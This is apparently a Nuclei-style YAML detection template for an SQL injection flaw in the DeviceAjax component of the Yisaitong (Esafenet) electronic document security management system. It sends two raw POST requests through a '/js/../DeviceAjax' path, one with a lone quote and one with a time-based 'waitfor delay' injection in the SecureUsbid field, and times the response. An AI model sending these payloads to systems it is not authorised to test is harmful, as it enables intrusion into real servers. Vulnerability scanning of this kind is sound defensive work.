id: poc-yaml-yisaitong-esafenet-deviceajax-sqli

info:
  name: 亿赛通电子文档安全管理系统 DeviceAjax SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template detects an SQL injection vulnerability in 亿赛通电子文档安全管理系统's DeviceAjax component.

variables:
  t1: '{{rand_int(5,10)}}'
  t2: '{{to_number(t1) + 2}}'

http:
  - raw:
      - |
        POST /CDGServer3/js/../DeviceAjax HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        command=delSecureUsb&SecureUsbid='
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "CDGServer3"
      - type: word
        part: body
        words:
          - "删除出错！"

  - raw:
      - |
        POST /CDGServer3/js/../DeviceAjax HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        command=delSecureUsb&SecureUsbid=-1'waitfor delay '0:0:{{t1}}'--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "CDGServer3"
      - type: word
        part: body
        words:
          - "OK"
      - type: dsl
        dsl:
          - 'duration > to_number(t1)'
          - 'duration < to_number(t2)'
